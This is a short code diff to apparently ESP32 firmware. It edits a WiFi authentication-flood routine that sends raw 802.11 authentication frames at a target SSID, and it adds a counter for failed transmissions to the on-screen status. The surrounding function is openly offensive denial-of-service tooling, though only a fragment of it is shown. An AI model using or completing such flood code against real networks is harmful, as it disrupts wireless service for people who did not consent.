@@ -78,6 +78,7 @@ void arsenal_auth_flood(void) {
     authFrame[29] = 0x00;
 
     int sent = 0;
+    int failed = 0;
     unsigned long startTime = millis();
     unsigned long lastDisplay = 0;
 
@@ -92,8 +93,8 @@ void arsenal_auth_flood(void) {
             authFrame[26] = 0x01;
             authFrame[27] = 0x00;
 
-            esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
-            sent++;
+            esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, authFrame, sizeof(authFrame), false);
+            if (err == ESP_OK) sent++; else failed++;
         }
 
         unsigned long now = millis();
@@ -107,7 +108,7 @@ void arsenal_auth_flood(void) {
             tft.printf("Target: %s", targetSSID.c_str());
             y += 14;
             tft.setCursor(12, y);
-            tft.printf("Sent: %d", sent);
+            tft.printf("Sent: %d  Failed: %d", sent, failed);
             y += 14;
             unsigned long elapsed = (now - startTime) / 1000;
             tft.setCursor(12, y);
